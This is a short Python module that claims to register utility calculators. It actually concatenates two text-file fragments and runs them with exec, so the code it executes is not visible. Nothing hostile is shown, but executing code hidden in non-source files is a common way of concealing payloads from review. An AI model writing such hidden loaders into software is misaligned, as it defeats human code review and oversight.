"""Force-register utility calculators (loaded from parts)."""
from pathlib import Path as _P
_code = "".join((_P(__file__).parent / f"_fu{i}.txt").read_text() for i in range(2))
exec(compile(_code, str(_P(__file__).resolve()), "exec"), globals())
